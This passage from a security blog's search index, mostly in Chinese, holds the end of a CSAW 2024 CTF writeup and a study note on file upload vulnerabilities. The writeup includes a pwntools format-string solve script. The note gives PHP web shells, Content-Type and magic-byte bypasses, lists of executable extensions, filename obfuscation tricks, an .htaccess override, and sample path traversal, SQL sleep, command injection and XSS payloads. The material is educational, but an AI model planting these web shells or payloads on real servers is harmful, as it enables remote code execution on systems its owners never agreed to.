*; do echo \u0026#34;File -\u0026gt; $f\u0026#34;; done reference\ncat filename:\necho $(\u0026lt;filename) 然後在~/\n執行剛剛手刻的ls -a，可以看到.flag\n再執行\necho $(\u0026lt;.flag) 就可以得到flag了，||這什麼怪題||\nMini Golfing #\r這題有開ASLR，不能亂跳\n可以利用printf找到main的位置，然後算offset\nsolve:\nfrom pwn import * # context.arch = \u0026#39;amd64\u0026#39; # context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] # # r = process(\u0026#39;golf\u0026#39;) # gdb.attach(r) r = remote(\u0026#39;golfing.ctf.csaw.io\u0026#39;, 9999) r.sendlineafter(b\u0026#39;? \u0026#39;, b\u0026#39;%171$p\u0026#39;) r.recvuntil(b\u0026#39;hello: \u0026#39;) start_addr = int(r.recvline().strip(),16) win_addr = start_addr - 0x223 + 0x209 print(hex(win_addr)) r.sendlineafter(\u0026#39;aim at!:\u0026#39;, hex(win_addr)) r.interactive() Nix Philosophies #\r看起來像是用C++的字串來混淆\n但程式功能如下:\n輸入字串 sum(自己取的) = 從第二個字元開始後的每個字元ascii相加 read(sum - 1603, buf, 32) 解法：\nfd(0)是stdin，所以就可以控制buf了\naaaaaaaaaaaaaaaaa3的sum=1603 -\u0026gt; fd是0\n輸入make every program a filter\n就可以得到flag了，這次比賽都沒正常的pwn:(\n","externalUrl":null,"permalink":"/writeups/csaw-2024/","section":"Writeups","summary":"","title":"CSAW'24 CTF Writeup","type":"writeups"},{"content":"文件上傳漏洞是指用戶上傳可能會造成危害的檔案(廢話\n伺服器如何處理靜態檔案的Request #\r檔案路徑 #\r傳統的網站會把檔案的request，1:1的映射到自己的檔案路徑，如：\nGET /files/avatars/profile.png HTTP/1.1 profile.png 的絕對位置可能為/var/www/html/files/avatars/profile.png\n回傳的檔案內容 #\r如果檔案類型為non-executable：伺服器會回傳檔案的內容 如果檔案類型為excutable：伺服器會把request的header和parameter指派給對應的變數，並回傳執行的結果輸出 如果檔案類型為excutable，但伺服器沒有設定要執行：大部分情況下會回傳error，但少部分情況會回傳檔案內容回來 Web Shell #\r如果使用者可以執行上傳的檔案，那麼這些檔案內容會造成危害\n任意讀取檔案 #\r\u0026lt;?php echo file_get_contents(\u0026#39;/path/to/target/file\u0026#39;); ?\u0026gt; 執行指令 #\r\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; 用這樣的方式可以傳遞parameter給web shell：\nGET /example.com/exploit.php?command=id HTTP/1.1 Bypassing #\rContent-Type #\r若是伺服器使用Content-Type驗證檔案\nPOST /images HTTP/1.1 Host: example.com Content-Length: 12345 Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456 ---------------------------012345678901234567890123456 Content-Disposition: form-data; name=\u0026#34;image\u0026#34;; filename=\u0026#34;exploit.php\u0026#34; Content-Type: image/png \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; ---------------------------012345678901234567890123456 Content-Disposition: form-data; name=\u0026#34;username\u0026#34; user ---------------------------012345678901234567890123456-- 將Content-Type改成image/png或其他\nmagic number #\r伺服器驗證檔案的header\n利用exiftool:\nexiftool -Comment=\u0026#34;\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\u0026#34; img.jpg 利用linux:\necho \u0026#39;\u0026lt;?php system($_REQUEST[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\u0026#39; \u0026gt;\u0026gt; img.png 副檔名驗證 #\r如果遇到副檔名被擋的情況\n使用其他副檔名 #\r以下副檔名之檔案為executable\nPHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module Working in PHPv8: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action Coldfusion: .cfm, .cfml, .cfc, .dbm Flash: .swf Perl: .pl, .cgi Erlang Yaws Web Server: .yaws 更改大小寫 #\rexploit.pHP\n在增加更多副檔名層級 #\rexploit.png.php exploit.php.png exploit.php%00.png%00.jpg\n副檔名尾端加入特殊字元 #\rexploit.php%20 exploit.php%0a exploit.php%00 exploit.php%0d%0a exploit.php/ exploit.php.\\ exploit. exploit.php.... exploit.pHp5.... 混淆副檔名parser #\r使用多個副檔名、特殊字元和填充多個null byte混淆副檔名parser\nexploit.png.php exploit.png.pHp5 exploit.php#.png exploit.php%00.png exploit.php\\x00.png exploit.php%0a.png exploit.php%0d%0a.png exploit.phpJunk123png 突破檔案名稱長度上限 #\rpython -c 'print \u0026quot;A\u0026quot; * 232' + .php.jpg\n繞過反繞過 #\rexploit.p.phphp\nOverriding The Server Configuration #\rApache #\r檢查/etc/apache2/apache2.conf(或httpd.conf)，確保server有允許使用.htaccess: \u0026lt;Directory /path/to/your/directory\u0026gt; AllowOverride All \u0026lt;/Directory\u0026gt; 上傳.htaccess於目前資料夾:\nAddType application/x-httpd-php evil\n上傳expoilt.evil，理論上會被當作php執行\nFilename Tricks #\rpath travelsal #\r伺服器解析後檔案可能上傳於上層目錄\n..%2Fexploit.php\nSQL injection #\r此payload可以暫停延遲10秒的sql\nsleep(10)-- -.jpg\ncommand injection #\r; sleep 10;\nXSS #\r\u0026lt;svg onload=alert(1)\u0026gt;\nReference #\rHackTricks Port Swigger ","externalUrl":null,"permalink":"/notes/web/file-upload-vulnerbility/","section":"Notes","summary":"","title":"File Upload Vulnerability","type":"notes"},{"content":"","externalUrl":null,"permalink":"/","section":"Homepage","summary":"","title":"Homepage","type":"page"},{"content":"","externalUrl":null,"permalink":"/notes/misc/","section":"Notes","summary":"","title":"Misc","type":"notes"},{"content":"","externalUrl":null,"permalink":"/notes/","section":"Notes","summary":"","title":"Notes","type":"notes"},{"content":"","externalUrl":null,"permalink":"/notes/others/","section":"Notes","summary":"","title":"Others","type":"notes"},{"content":"","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","externalUrl":null,"permalink":"/notes/pwn/","section":"Notes","summary":"","title":"Pwn","type":"notes"},{"content":"","externalUrl":null,"permalink":"/notes/reverse/","section":"Notes","summary":"","title":"Reverse","type":"notes"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","externalUrl":null,"permalink":"/notes/tools/","section":"Notes","summary":"","title":"Tools","type":"notes"},{"content":"","externalUrl":null,"permalink":"/topics/","section":"Topics","summary":"","title":"Topics","type":"topics"},{"content":"","externalUrl":null,"permalink":"/notes/web/","section":"Notes","summary":"","title":"Web","type":"notes"},{"content":"","externalUrl":null,"permalink":"/writeups/","section":"Writeups","summary":"","title":"Writeups","type":"writeups"}]